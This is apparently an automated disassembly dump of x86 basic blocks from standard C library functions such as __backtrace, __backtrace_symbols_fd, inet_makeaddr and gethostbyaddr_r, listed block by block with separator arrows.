0xb0fbc46:	mov	eax, dword ptr [ebx + 0x295c]
0xb0fbc4c:	test	eax, eax
0xb0fbc4e:	je	0xb0fbc58
None
|
|
|
v
0xb0fbbd8:	mov	dword ptr [ebx + 0x2964], eax
0xb0fbbde:	lea	eax, dword ptr [ebx - 0x47b78]
0xb0fbbe4:	mov	dword ptr [esp + 4], eax
0xb0fbbe8:	mov	eax, dword ptr [ebx + 0x2954]
0xb0fbbee:	mov	dword ptr [esp], eax
0xb0fbbf1:	call	0xb123b40
None
|
|
|
v
0xb0fbbc6:	lea	edx, dword ptr [ebx - 0x47b8a]
0xb0fbbcc:	mov	dword ptr [esp + 4], edx
0xb0fbbd0:	mov	dword ptr [esp], eax
0xb0fbbd3:	call	0xb123b40
None
|
|
|
v
0xb0fbc50:	add	esp, 0x14
0xb0fbc53:	pop	ebx
0xb0fbc54:	pop	ebp
0xb0fbc55:	ret	
None
|
|
|
v
0xb0fbb90:	push	ebp
0xb0fbb91:	mov	ebp, esp
0xb0fbb93:	push	ebx
0xb0fbb94:	call	0xb1267db
None
|
|
|
v
0xb0fbb99:	add	ebx, 0xaf467
0xb0fbb9f:	sub	esp, 0x14
0xb0fbba2:	mov	dword ptr [esp + 4], 0x80000001
0xb0fbbaa:	lea	eax, dword ptr [ebx - 0x4b0f3]
0xb0fbbb0:	mov	dword ptr [esp], eax
0xb0fbbb3:	call	0xb123ae0
None
|
|
|
v
0xb0fbc14:	mov	dword ptr [ebx + 0x295c], eax
0xb0fbc1a:	lea	eax, dword ptr [ebx - 0x47b5b]
0xb0fbc20:	mov	dword ptr [esp + 4], eax
0xb0fbc24:	mov	eax, dword ptr [ebx + 0x2954]
0xb0fbc2a:	mov	dword ptr [esp], eax
0xb0fbc2d:	call	0xb123b40
None
|
|
|
v
0xb0fbc70:	mov	dword ptr [ebx + 0x2954], 0
0xb0fbc7a:	add	esp, 0x14
0xb0fbc7d:	pop	ebx
0xb0fbc7e:	pop	ebp
0xb0fbc7f:	ret	
None
|
|
|
v
0xb0fbbb8:	test	eax, eax
0xb0fbbba:	mov	dword ptr [ebx + 0x2954], eax
0xb0fbbc0:	je	0xb0fbc50
None
|
|
|
v
0xb0fbc32:	mov	edx, dword ptr [ebx + 0x2960]
0xb0fbc38:	test	edx, edx
0xb0fbc3a:	mov	dword ptr [ebx + 0x2958], eax
0xb0fbc40:	je	0xb0fbc58
None
|
|
|
v
0xb0fbc58:	mov	eax, dword ptr [ebx + 0x2954]
0xb0fbc5e:	mov	dword ptr [ebx + 0x2964], 0
0xb0fbc68:	mov	dword ptr [esp], eax
0xb0fbc6b:	call	0xb123bb0
None
|
|
|
v
0xb0fbc42:	test	eax, eax
0xb0fbc44:	je	0xb0fbc58
None
|
|
|
v
0xb0fbbf6:	mov	dword ptr [ebx + 0x2960], eax
0xb0fbbfc:	lea	eax, dword ptr [ebx - 0x47b6a]
0xb0fbc02:	mov	dword ptr [esp + 4], eax
0xb0fbc06:	mov	eax, dword ptr [ebx + 0x2954]
0xb0fbc0c:	mov	dword ptr [esp], eax
0xb0fbc0f:	call	0xb123b40
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__backtrace
TOTAL BLOCKS :27
0xb0fbde3:	mov	eax, ecx
0xb0fbde5:	lea	esi, dword ptr [esi]
0xb0fbde8:	cmp	eax, 0xff
0xb0fbdeb:	mov	edx, 0
0xb0fbdf0:	cmove	eax, edx
0xb0fbdf3:	add	esp, 0x3c
0xb0fbdf6:	pop	ebx
0xb0fbdf7:	pop	esi
0xb0fbdf8:	pop	edi
0xb0fbdf9:	pop	ebp
0xb0fbdfa:	ret	
None
|
|
|
v
0xb0fbd5f:	test	esi, esi
0xb0fbd61:	jle	0xb0fbd75
None
|
|
|
v
0xb0fbd75:	mov	eax, dword ptr [ebp - 0x28]
0xb0fbd78:	cmp	eax, 1
0xb0fbd7b:	jle	0xb0fbd8c
None
|
|
|
v
0xb0fbe25:	mov	eax, dword ptr [ebx + 0x2964]
0xb0fbe2b:	test	eax, eax
0xb0fbe2d:	jne	0xb0fbd5f
None
|
|
|
v
0xb0fbe40:	mov	eax, dword ptr [ebp - 0x3c]
0xb0fbe43:	jmp	0xb0fbde8
None
|
|
|
v
0xb0fbdd3:	mov	eax, dword ptr [edx + 4]
0xb0fbdd6:	cmp	ecx, esi
0xb0fbdd8:	mov	dword ptr [ebp - 0x3c], ecx
0xb0fbddb:	mov	dword ptr [edi + ecx*4 - 4], eax
0xb0fbddf:	mov	edx, dword ptr [edx]
0xb0fbde1:	jne	0xb0fbdb8
None
|
|
|
v
0xb0fbdac:	lea	ecx, dword ptr [eax + 1]
0xb0fbdaf:	jmp	0xb0fbdd3
None
|
|
|
v
0xb0fbd00:	push	ebp
0xb0fbd01:	mov	ebp, esp
0xb0fbd03:	push	edi
0xb0fbd04:	push	esi
0xb0fbd05:	push	ebx
0xb0fbd06:	call	0xb1267db
None
|
|
|
v
0xb0fbda7:	test	dl, 3
0xb0fbdaa:	jne	0xb0fbde8
None
|
|
|
v
0xb0fbe60:	sub	eax, 1
0xb0fbe63:	jmp	0xb0fbdf3
None
|
|
|
v
0xb0fbd0b:	add	ebx, 0xaf2f5
0xb0fbd11:	sub	esp, 0x3c
0xb0fbd14:	mov	edi, dword ptr [ebp + 8]
0xb0fbd17:	mov	esi, dword ptr [ebp + 0xc]
0xb0fbd1a:	mov	dword ptr [ebp - 0x20], 0
0xb0fbd21:	mov	dword ptr [ebp - 0x1c], 0
0xb0fbd28:	mov	dword ptr [ebp - 0x2c], edi
0xb0fbd2b:	mov	dword ptr [ebp - 0x28], 0xffffffff
0xb0fbd32:	mov	eax, dword ptr [ebx + 0x38d8]
0xb0fbd38:	mov	dword ptr [ebp - 0x24], esi
0xb0fbd3b:	test	eax, eax
0xb0fbd3d:	jne	0xb0fbe00
None
|
|
|
v
0xb0fbe00:	lea	edx, dword ptr [ebx - 0xaf470]
0xb0fbe06:	mov	eax, dword ptr [ebx + 0x389c]
0xb0fbe0c:	mov	dword ptr [esp + 4], edx
0xb0fbe10:	lea	edx, dword ptr [ebx + 0x2950]
0xb0fbe16:	ror	eax, 9
0xb0fbe19:	xor	eax, dword ptr gs:[0x18]
0xb0fbe20:	mov	dword ptr [esp], edx
0xb0fbe23:	call	eax
None
|
|
|
v
0xb0fbd7d:	mov	edx, dword ptr [ebp - 0x2c]
0xb0fbd80:	mov	edx, dword ptr [edx + eax*4 - 4]
0xb0fbd84:	test	edx, edx
0xb0fbd86:	je	0xb0fbe60
None
|
|
|
v
0xb0fbdb8:	cmp	edx, dword ptr [ebp - 0x40]
0xb0fbdbb:	jb	0xb0fbe40
None
|
|
|
v
0xb0fbd63:	lea	edx, dword ptr [ebp - 0x2c]
0xb0fbd66:	mov	dword ptr [esp + 4], edx
0xb0fbd6a:	lea	edx, dword ptr [ebx - 0xaf380]
0xb0fbd70:	mov	dword ptr [esp], edx
0xb0fbd73:	call	eax
None
|
|
|
v
0xb0fbe33:	add	esp, 0x3c
0xb0fbe36:	xor	eax, eax
0xb0fbe38:	pop	ebx
0xb0fbe39:	pop	esi
0xb0fbe3a:	pop	edi
0xb0fbe3b:	pop	ebp
0xb0fbe3c:	ret	
None
|
|
|
v
0xb0fbe48:	call	0xb0fbb90
None
|
|
|
v
0xb0fbd43:	mov	ecx, dword ptr [ebx + 0x2950]
0xb0fbd49:	test	ecx, ecx
0xb0fbd4b:	je	0xb0fbe48
None
|
|
|
v
0xb0fbdf3:	add	esp, 0x3c
0xb0fbdf6:	pop	ebx
0xb0fbdf7:	pop	esi
0xb0fbdf8:	pop	edi
0xb0fbdf9:	pop	ebp
0xb0fbdfa:	ret	
None
|
|
|
v
0xb0fbe4d:	or	dword ptr [ebx + 0x2950], 2
0xb0fbe54:	jmp	0xb0fbd51
None
|
|
|
v
0xb0fbd51:	mov	eax, dword ptr [ebx + 0x2964]
0xb0fbd57:	test	eax, eax
0xb0fbd59:	je	0xb0fbe33
None
|
|
|
v
0xb0fbd9d:	mov	ecx, dword ptr [ebx - 0x148]
0xb0fbda3:	cmp	edx, dword ptr [ecx]
0xb0fbda5:	ja	0xb0fbde8
None
|
|
|
v
0xb0fbdcb:	add	ecx, 1
0xb0fbdce:	test	dl, 3
0xb0fbdd1:	jne	0xb0fbe40
None
|
|
|
v
0xb0fbde8:	cmp	eax, 0xff
0xb0fbdeb:	mov	edx, 0
0xb0fbdf0:	cmove	eax, edx
0xb0fbdf3:	add	esp, 0x3c
0xb0fbdf6:	pop	ebx
0xb0fbdf7:	pop	esi
0xb0fbdf8:	pop	edi
0xb0fbdf9:	pop	ebp
0xb0fbdfa:	ret	
None
|
|
|
v
0xb0fbd8c:	cmp	esi, eax
0xb0fbd8e:	jle	0xb0fbde8
None
|
|
|
v
0xb0fbdc1:	mov	eax, dword ptr [ebx - 0x148]
0xb0fbdc7:	cmp	dword ptr [eax], edx
0xb0fbdc9:	jb	0xb0fbe40
None
|
|
|
v
0xb0fbd90:	mov	ecx, dword ptr [ebp - 0x1c]
0xb0fbd93:	mov	edx, dword ptr [ebp - 0x20]
0xb0fbd96:	mov	dword ptr [ebp - 0x40], ecx
0xb0fbd99:	cmp	edx, ecx
0xb0fbd9b:	jb	0xb0fbde8
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__backtrace_symbols_fd
TOTAL BLOCKS :24
0xb0fc3a0:	mov	dword ptr [ebp - 0x98], 3
0xb0fc3aa:	mov	edx, 2
0xb0fc3af:	xor	ecx, ecx
0xb0fc3b1:	mov	dword ptr [ebp - 0x94], 1
0xb0fc3bb:	jmp	0xb0fc2e8
None
|
|
|
v
0xb0fc1bf:	mov	dword ptr [ebp - 0x5c], eax
0xb0fc1c2:	mov	eax, dword ptr [ebp - 0x68]
0xb0fc1c5:	test	eax, eax
0xb0fc1c7:	je	0xb0fc3f0
None
|
|
|
v
0xb0fc1b4:	mov	dword ptr [esp], eax
0xb0fc1b7:	mov	dword ptr [ebp - 0x60], eax
0xb0fc1ba:	call	0xb07ae80
None
|
|
|
v
0xb0fc458:	mov	dword ptr [ebp - 0x98], 4
0xb0fc462:	mov	edx, 3
0xb0fc467:	mov	ecx, 1
0xb0fc46c:	mov	dword ptr [ebp - 0x94], 2
0xb0fc476:	jmp	0xb0fc2e8
None
|
|
|
v
0xb0fc375:	cmp	esi, dword ptr [ebp + 0xc]
0xb0fc378:	je	0xb0fc3c0
None
|
|
|
v
0xb0fc2a9:	mov	ecx, dword ptr [ebp - 0x9c]
0xb0fc2af:	mov	edx, dword ptr [ebp - 0xb8]
0xb0fc2b5:	sub	ecx, eax
0xb0fc2b7:	mov	dword ptr [ebp + edx*8 - 0x5c], ecx
0xb0fc2bb:	mov	ecx, dword ptr [ebp - 0xbc]
0xb0fc2c1:	mov	dword ptr [ebp + edx*8 - 0x60], eax
0xb0fc2c5:	lea	eax, dword ptr [ebx - 0x4a5d8]
0xb0fc2cb:	mov	edx, dword ptr [ebp - 0xb4]
0xb0fc2d1:	mov	dword ptr [ebp + ecx*8 - 0x60], eax
0xb0fc2d5:	mov	dword ptr [ebp + ecx*8 - 0x5c], 1
0xb0fc2dd:	mov	ecx, dword ptr [ebp - 0xb0]
0xb0fc2e3:	nop	
0xb0fc2e4:	lea	esi, dword ptr [esi]
0xb0fc2e8:	mov	eax, dword ptr [ebp - 0xa4]
0xb0fc2ee:	mov	dword ptr [esp + 0xc], 0
0xb0fc2f6:	mov	dword ptr [esp + 8], 0x10
0xb0fc2fe:	mov	dword ptr [ebp - 0x90], edx
0xb0fc304:	mov	dword ptr [ebp + ecx*8 - 0x60], eax
0xb0fc308:	mov	eax, dword ptr [ebp - 0x8c]
0xb0fc30e:	mov	dword ptr [ebp + ecx*8 - 0x5c], 3
0xb0fc316:	mov	dword ptr [esp + 4], eax
0xb0fc31a:	mov	eax, dword ptr [edi + esi*4]
0xb0fc31d:	add	esi, 1
0xb0fc320:	mov	dword ptr [esp], eax
0xb0fc323:	call	0xb043170
None
|
|
|
v
0xb0fc3c0:	lea	esp, dword ptr [ebp - 0xc]
0xb0fc3c3:	pop	ebx
0xb0fc3c4:	pop	esi
0xb0fc3c5:	pop	edi
0xb0fc3c6:	pop	ebp
0xb0fc3c7:	ret	
None
|
|
|
v
0xb0fc120:	push	ebp
0xb0fc121:	mov	ebp, esp
0xb0fc123:	push	edi
0xb0fc124:	push	esi
0xb0fc125:	push	ebx
0xb0fc126:	sub	esp, 0xcc
0xb0fc12c:	mov	eax, dword ptr [ebp + 0xc]
0xb0fc12f:	call	0xb1267db
None
|
|
|
v
0xb0fc26d:	mov	dword ptr [ebp - 0xb0], ecx
0xb0fc273:	mov	ecx, dword ptr [ebp - 0x90]
0xb0fc279:	mov	dword ptr [esp + 0xc], 0
0xb0fc281:	mov	dword ptr [esp + 8], 0x10
0xb0fc289:	mov	dword ptr [esp], eax
0xb0fc28c:	mov	dword ptr [ebp + ecx*8 - 0x5c], 3
0xb0fc294:	mov	ecx, dword ptr [ebp - 0x9c]
0xb0fc29a:	mov	dword ptr [ebp - 0xb4], edx
0xb0fc2a0:	mov	dword ptr [esp + 4], ecx
0xb0fc2a4:	call	0xb043170
None
|
|
|
v
0xb0fc2e8:	mov	eax, dword ptr [ebp - 0xa4]
0xb0fc2ee:	mov	dword ptr [esp + 0xc], 0
0xb0fc2f6:	mov	dword ptr [esp + 8], 0x10
0xb0fc2fe:	mov	dword ptr [ebp - 0x90], edx
0xb0fc304:	mov	dword ptr [ebp + ecx*8 - 0x60], eax
0xb0fc308:	mov	eax, dword ptr [ebp - 0x8c]
0xb0fc30e:	mov	dword ptr [ebp + ecx*8 - 0x5c], 3
0xb0fc316:	mov	dword ptr [esp + 4], eax
0xb0fc31a:	mov	eax, dword ptr [edi + esi*4]
0xb0fc31d:	add	esi, 1
0xb0fc320:	mov	dword ptr [esp], eax
0xb0fc323:	call	0xb043170
None
|
|
|
v
0xb0fc1cd:	mov	ecx, dword ptr [ebp - 0xc0]
0xb0fc1d3:	mov	dword ptr [esp], eax
0xb0fc1d6:	mov	dword ptr [ebp - 0x54], 1
0xb0fc1dd:	mov	dword ptr [ebp - 0x50], eax
0xb0fc1e0:	mov	dword ptr [ebp - 0x58], ecx
0xb0fc1e3:	call	0xb07ae80
None
|
|
|
v
0xb0fc142:	lea	eax, dword ptr [ebp - 0x78]
0xb0fc145:	xor	edi, edi
0xb0fc147:	mov	dword ptr [ebp - 0x8c], eax
0xb0fc14d:	lea	eax, dword ptr [ebp - 0x84]
0xb0fc153:	mov	esi, edi
0xb0fc155:	mov	dword ptr [ebp - 0xa0], eax
0xb0fc15b:	lea	eax, dword ptr [ebp - 0x70]
0xb0fc15e:	mov	edi, dword ptr [ebp + 8]
0xb0fc161:	mov	dword ptr [ebp - 0x9c], eax
0xb0fc167:	lea	eax, dword ptr [ebx - 0x47b0b]
0xb0fc16d:	mov	dword ptr [ebp - 0xa4], eax
0xb0fc173:	lea	eax, dword ptr [ebx - 0x47b07]
0xb0fc179:	mov	dword ptr [ebp - 0xa8], eax
0xb0fc17f:	lea	eax, dword ptr [ebp - 0x60]
0xb0fc182:	mov	dword ptr [ebp - 0xac], eax
0xb0fc188:	lea	eax, dword ptr [ebx - 0x4a5a8]
0xb0fc18e:	mov	dword ptr [ebp - 0xc0], eax
0xb0fc194:	jmp	0xb0fc37a
None
|
|
|
v
0xb0fc3c8:	mov	edx, dword ptr [ebp - 0x90]
0xb0fc3ce:	lea	eax, dword ptr [ebx - 0x49492]
0xb0fc3d4:	mov	dword ptr [ebp + edx*8 - 0x60], eax
0xb0fc3d8:	mov	eax, dword ptr [ebp - 0xb0]
0xb0fc3de:	sub	eax, dword ptr [ebp - 0xb4]
0xb0fc3e4:	mov	edx, dword ptr [ebp - 0xc4]
0xb0fc3ea:	jmp	0xb0fc26d
None
|
|
|
v
0xb0fc3fc:	mov	ecx, dword ptr [ebp - 0xc0]
0xb0fc402:	mov	edx, 7
0xb0fc407:	mov	dword ptr [ebp - 0x54], 1
0xb0fc40e:	mov	dword ptr [ebp - 0xb0], eax
0xb0fc414:	mov	dword ptr [ebp - 0x64], eax
0xb0fc417:	mov	dword ptr [ebp - 0x58], ecx
0xb0fc41a:	mov	ecx, 5
0xb0fc41f:	mov	dword ptr [ebp - 0x98], 8
0xb0fc429:	mov	dword ptr [ebp - 0x94], 6
0xb0fc433:	mov	dword ptr [ebp - 0xbc], 4
0xb0fc43d:	mov	dword ptr [ebp - 0xb8], 3
0xb0fc447:	mov	dword ptr [ebp - 0x90], 2
0xb0fc451:	jmp	0xb0fc230
None
|
|
|
v
0xb0fc3f0:	mov	eax, dword ptr [ebp - 0x84]
0xb0fc3f6:	mov	eax, dword ptr [eax]
0xb0fc3f8:	test	eax, eax
0xb0fc3fa:	je	0xb0fc458
None
|
|
|
v
0xb0fc37a:	mov	eax, dword ptr [edi + esi*4]
0xb0fc37d:	mov	ecx, dword ptr [ebp - 0xa0]
0xb0fc383:	mov	edx, dword ptr [ebp - 0x9c]
0xb0fc389:	mov	dword ptr [esp], 0
0xb0fc390:	call	0xb123540
None
|
|
|
v
0xb0fc24b:	mov	edx, dword ptr [ebp - 0x90]
0xb0fc251:	lea	eax, dword ptr [ebx - 0x49496]
0xb0fc257:	mov	dword ptr [ebp + edx*8 - 0x60], eax
0xb0fc25b:	mov	eax, dword ptr [ebp - 0xb4]
0xb0fc261:	mov	edx, dword ptr [ebp - 0xc4]
0xb0fc267:	sub	eax, dword ptr [ebp - 0xb0]
0xb0fc26d:	mov	dword ptr [ebp - 0xb0], ecx
0xb0fc273:	mov	ecx, dword ptr [ebp - 0x90]
0xb0fc279:	mov	dword ptr [esp + 0xc], 0
0xb0fc281:	mov	dword ptr [esp + 8], 0x10
0xb0fc289:	mov	dword ptr [esp], eax
0xb0fc28c:	mov	dword ptr [ebp + ecx*8 - 0x5c], 3
0xb0fc294:	mov	ecx, dword ptr [ebp - 0x9c]
0xb0fc29a:	mov	dword ptr [ebp - 0xb4], edx
0xb0fc2a0:	mov	dword ptr [esp + 4], ecx
0xb0fc2a4:	call	0xb043170
None
|
|
|
v
0xb0fc1a0:	mov	eax, dword ptr [ebp - 0x70]
0xb0fc1a3:	test	eax, eax
0xb0fc1a5:	je	0xb0fc3a0
None
|
|
|
v
0xb0fc395:	sub	esp, 4
0xb0fc398:	test	eax, eax
0xb0fc39a:	jne	0xb0fc1a0
None
|
|
|
v
0xb0fc1e8:	mov	edx, 8
0xb0fc1ed:	mov	ecx, 6
0xb0fc1f2:	mov	dword ptr [ebp - 0x98], 9
0xb0fc1fc:	mov	dword ptr [ebp - 0x94], 7
0xb0fc206:	mov	dword ptr [ebp - 0xbc], 5
0xb0fc210:	mov	dword ptr [ebp - 0xb8], 4
0xb0fc21a:	mov	dword ptr [ebp - 0x90], 3
0xb0fc224:	mov	dword ptr [ebp - 0x4c], eax
0xb0fc227:	mov	eax, dword ptr [ebp - 0x64]
0xb0fc22a:	mov	dword ptr [ebp - 0xb0], eax
0xb0fc230:	mov	eax, dword ptr [edi + esi*4]
0xb0fc233:	cmp	eax, dword ptr [ebp - 0xb0]
0xb0fc239:	mov	dword ptr [ebp - 0xc4], edx
0xb0fc23f:	mov	dword ptr [ebp - 0xb4], eax
0xb0fc245:	jb	0xb0fc3c8
None
|
|
|
v
0xb0fc328:	mov	ecx, dword ptr [ebp - 0x8c]
0xb0fc32e:	mov	edx, dword ptr [ebp - 0x94]
0xb0fc334:	sub	ecx, eax
0xb0fc336:	mov	dword ptr [ebp + edx*8 - 0x60], eax
0xb0fc33a:	mov	eax, dword ptr [ebp - 0xa8]
0xb0fc340:	mov	dword ptr [ebp + edx*8 - 0x5c], ecx
0xb0fc344:	mov	edx, dword ptr [ebp - 0x90]
0xb0fc34a:	mov	dword ptr [ebp + edx*8 - 0x60], eax
0xb0fc34e:	mov	eax, dword ptr [ebp - 0x98]
0xb0fc354:	mov	dword ptr [ebp + edx*8 - 0x5c], 2
0xb0fc35c:	mov	dword ptr [esp + 8], eax
0xb0fc360:	mov	eax, dword ptr [ebp - 0xac]
0xb0fc366:	mov	dword ptr [esp + 4], eax
0xb0fc36a:	mov	eax, dword ptr [ebp + 0x10]
0xb0fc36d:	mov	dword ptr [esp], eax
0xb0fc370:	call	0xb0e31e0
None
|
|
|
v
0xb0fc1ab:	cmp	byte ptr [eax], 0
0xb0fc1ae:	je	0xb0fc3a0
None
|
|
|
v
0xb0fc230:	mov	eax, dword ptr [edi + esi*4]
0xb0fc233:	cmp	eax, dword ptr [ebp - 0xb0]
0xb0fc239:	mov	dword ptr [ebp - 0xc4], edx
0xb0fc23f:	mov	dword ptr [ebp - 0xb4], eax
0xb0fc245:	jb	0xb0fc3c8
None
|
|
|
v
0xb0fc134:	add	ebx, 0xaeecc
0xb0fc13a:	test	eax, eax
0xb0fc13c:	jle	0xb0fc3c0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:inet_makeaddr
TOTAL BLOCKS :7
0xb0fd595:	mov	ecx, dword ptr [esp + 0xc]
0xb0fd599:	or	ecx, edx
0xb0fd59b:	cmp	edx, 0xffffff
0xb0fd5a1:	ja	0xb0fd5c2
None
|
|
|
v
0xb0fd5c2:	bswap	ecx
0xb0fd5c4:	mov	dword ptr [eax], ecx
0xb0fd5c6:	ret	4
None
|
|
|
v
0xb0fd5b8:	movzx	ecx, word ptr [esp + 0xc]
0xb0fd5bd:	shl	edx, 0x10
0xb0fd5c0:	or	ecx, edx
0xb0fd5c2:	bswap	ecx
0xb0fd5c4:	mov	dword ptr [eax], ecx
0xb0fd5c6:	ret	4
None
|
|
|
v
0xb0fd580:	mov	edx, dword ptr [esp + 8]
0xb0fd584:	mov	eax, dword ptr [esp + 4]
0xb0fd588:	cmp	edx, 0x7f
0xb0fd58b:	jbe	0xb0fd5d0
None
|
|
|
v
0xb0fd5d0:	mov	ecx, dword ptr [esp + 0xc]
0xb0fd5d4:	shl	edx, 0x18
0xb0fd5d7:	and	ecx, 0xffffff
0xb0fd5dd:	or	ecx, edx
0xb0fd5df:	bswap	ecx
0xb0fd5e1:	mov	dword ptr [eax], ecx
0xb0fd5e3:	ret	4
None
|
|
|
v
0xb0fd58d:	cmp	edx, 0xffff
0xb0fd593:	jbe	0xb0fd5b8
None
|
|
|
v
0xb0fd5a3:	movzx	ecx, byte ptr [esp + 0xc]
0xb0fd5a8:	shl	edx, 8
0xb0fd5ab:	or	ecx, edx
0xb0fd5ad:	bswap	ecx
0xb0fd5af:	mov	dword ptr [eax], ecx
0xb0fd5b1:	ret	4
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:gethostbyaddr_r
TOTAL BLOCKS :54
0xb0fdd5d:	xor	eax, eax
0xb0fdd5f:	jmp	0xb0fdc26
None
|
|
|
v
0xb0fdc38:	mov	eax, dword ptr [ebp + 8]
0xb0fdc3b:	mov	dword ptr [esp + 8], 0x10
0xb0fdc43:	mov	dword ptr [esp + 4], eax
0xb0fdc47:	lea	eax, dword ptr [ebx - 0x4cae0]
0xb0fdc4d:	mov	dword ptr [esp], eax
0xb0fdc50:	call	0xb07c620
None
|
|
|
v
0xb0fdba0:	mov	dword ptr [ebx + 0x3a58], 0
0xb0fdbaa:	lea	eax, dword ptr [ebx + 0x3930]
0xb0fdbb0:	cmp	byte ptr [eax + 4], 0
0xb0fdbb4:	jne	0xb0fda62
None
|
|
|
v
0xb0fdbaa:	lea	eax, dword ptr [ebx + 0x3930]
0xb0fdbb0:	cmp	byte ptr [eax + 4], 0
0xb0fdbb4:	jne	0xb0fda62
None
|
|
|
v
0xb0fdd0c:	mov	eax, dword ptr [ebx - 0xfc]
0xb0fdd12:	mov	eax, dword ptr [eax]
0xb0fdd14:	test	eax, eax
0xb0fdd16:	je	0xb0fdd64
None
|
|
|
v
0xb0fdb97:	lea	esp, dword ptr [ebp - 0xc]
0xb0fdb9a:	pop	ebx
0xb0fdb9b:	pop	esi
0xb0fdb9c:	pop	edi
0xb0fdb9d:	pop	ebp
0xb0fdb9e:	ret	
None
|
|
|
v
0xb0fda6f:	xor	edx, edx
0xb0fda71:	mov	eax, dword ptr [ebx + 0x2994]
0xb0fda77:	ror	eax, 9
0xb0fda7a:	xor	eax, dword ptr gs:[0x18]
0xb0fda81:	mov	dword ptr [ebp - 0x1c], eax
0xb0fda84:	mov	eax, dword ptr [ebx + 0x2998]
0xb0fda8a:	ror	eax, 9
0xb0fda8d:	xor	eax, dword ptr gs:[0x18]
0xb0fda94:	cmp	eax, 0xff
0xb0fda97:	mov	dword ptr [ebp - 0x20], eax
0xb0fda9a:	mov	eax, dword ptr gs:[0]
0xb0fdaa0:	sete	dl
0xb0fdaa3:	mov	dword ptr [ebp - 0x2c], eax
0xb0fdaa6:	test	edx, edx
0xb0fdaa8:	jne	0xb0fdd71
None
|
|
|
v
0xb0fdcaf:	mov	eax, 0xffffffff
0xb0fdcb4:	xor	eax, dword ptr gs:[0x18]
0xb0fdcbb:	rol	eax, 9
0xb0fdcbe:	mov	dword ptr [ebx + 0x2998], eax
0xb0fdcc4:	mov	eax, dword ptr gs:[0]
0xb0fdcca:	mov	dword ptr [ebp - 0x2c], eax
0xb0fdccd:	mov	byte ptr [ebx + 0x299c], 1
0xb0fdcd4:	jmp	0xb0fdaa6
None
|
|
|
v
0xb0fda62:	cmp	byte ptr [ebx + 0x299c], 0
0xb0fda69:	je	0xb0fdc90
None
|
|
|
v
0xb0fdc19:	mov	eax, dword ptr [ebp + 0x14]
0xb0fdc1c:	mov	dword ptr [esp], eax
0xb0fdc1f:	call	0xb10ba90
None
|
|
|
v
0xb0fdc5d:	mov	eax, dword ptr [ebp + 0x20]
0xb0fdc60:	mov	dword ptr [edi], 1
0xb0fdc66:	mov	dword ptr [eax], 0
0xb0fdc6c:	mov	eax, 2
0xb0fdc71:	jmp	0xb0fdb97
None
|
|
|
v
0xb0fda50:	add	eax, 1
0xb0fda53:	cmp	eax, 0x64
0xb0fda56:	jg	0xb0fdba0
None
|
|
|
v
0xb0fdca6:	sub	esp, 4
0xb0fdca9:	test	eax, eax
0xb0fdcab:	mov	edx, eax
0xb0fdcad:	je	0xb0fdcd9
None
|
|
|
v
0xb0fdb4d:	cmp	dword ptr [edi], -1
0xb0fdb50:	jne	0xb0fdac8
None
|
|
|
v
0xb0fdc8b:	nop	
0xb0fdc8c:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb0fdc78:	je	0xb0fdbaa
None
|
|
|
v
0xb0fdaa6:	test	edx, edx
0xb0fdaa8:	jne	0xb0fdd71
None
|
|
|
v
0xb0fdafd:	mov	eax, dword ptr [ebp - 0x1c]
0xb0fdb00:	mov	dword ptr [esp], eax
0xb0fdb03:	call	0xb123900
None
|
|
|
v
0xb0fdc90:	lea	edx, dword ptr [ebp - 0x1c]
0xb0fdc93:	xor	ecx, ecx
0xb0fdc95:	mov	dword ptr [esp], edx
0xb0fdc98:	lea	eax, dword ptr [ebp - 0x20]
0xb0fdc9b:	lea	edx, dword ptr [ebx - 0x47ac0]
0xb0fdca1:	call	0xb10d930
None
|
|
|
v
0xb0fdbba:	mov	eax, dword ptr [ebp + 0x20]
0xb0fdbbd:	mov	dword ptr [esp + 0x1c], edi
0xb0fdbc1:	mov	dword ptr [esp + 0x18], eax
0xb0fdbc5:	mov	eax, dword ptr [ebp + 0x1c]
0xb0fdbc8:	mov	dword ptr [esp + 0x14], eax
0xb0fdbcc:	mov	eax, dword ptr [ebp + 0x18]
0xb0fdbcf:	mov	dword ptr [esp + 0x10], eax
0xb0fdbd3:	mov	eax, dword ptr [ebp + 0x14]
0xb0fdbd6:	mov	dword ptr [esp + 0xc], eax
0xb0fdbda:	mov	eax, dword ptr [ebp + 0x10]
0xb0fdbdd:	mov	dword ptr [esp + 8], eax
0xb0fdbe1:	mov	eax, dword ptr [ebp + 0xc]
0xb0fdbe4:	mov	dword ptr [esp + 4], eax
0xb0fdbe8:	mov	eax, dword ptr [ebp + 8]
0xb0fdbeb:	mov	dword ptr [esp], eax
0xb0fdbee:	call	0xb11dcb0
None
|
|
|
v
0xb0fddaa:	mov	eax, dword ptr [ebp + 0x20]
0xb0fddad:	mov	dword ptr [edi], 0xffffffff
0xb0fddb3:	mov	edx, dword ptr [ebp - 0x2c]
0xb0fddb6:	mov	dword ptr [eax], 0
0xb0fddbc:	mov	eax, dword ptr [ebx - 0xdc]
0xb0fddc2:	mov	eax, dword ptr [edx + eax]
0xb0fddc5:	jmp	0xb0fdb97
None
|
|
|
v
0xb0fda31:	add	ebx, 0xad5cf
0xb0fda37:	cmp	dword ptr [ebp + 0xc], 0x10
0xb0fda3b:	je	0xb0fdc38
None
|
|
|
v
0xb0fdb7a:	mov	eax, dword ptr [ebp - 0x2c]
0xb0fdb7d:	mov	edx, dword ptr [ebp - 0x30]
0xb0fdb80:	mov	ecx, dword ptr [eax + edx]
0xb0fdb83:	cmp	ecx, 0x22
0xb0fdb86:	je	0xb0fdd40
None
|
|
|
v
0xb0fdbf7:	jmp	0xb0fda62
None
|
|
|
v
0xb0fdc24:	xor	eax, eax
0xb0fdc26:	mov	edx, dword ptr [ebp - 0x2c]
0xb0fdc29:	mov	ecx, dword ptr [ebp - 0x30]
0xb0fdc2c:	mov	dword ptr [edx + ecx], eax
0xb0fdc2f:	lea	esp, dword ptr [ebp - 0xc]
0xb0fdc32:	pop	ebx
0xb0fdc33:	pop	esi
0xb0fdc34:	pop	edi
0xb0fdc35:	pop	ebp
0xb0fdc36:	ret	
None
|
|
|
v
0xb0fdd40:	cmp	esi, 0xfe
0xb0fdd43:	mov	eax, 0x16
0xb0fdd48:	jne	0xb0fdc26
None
|
|
|
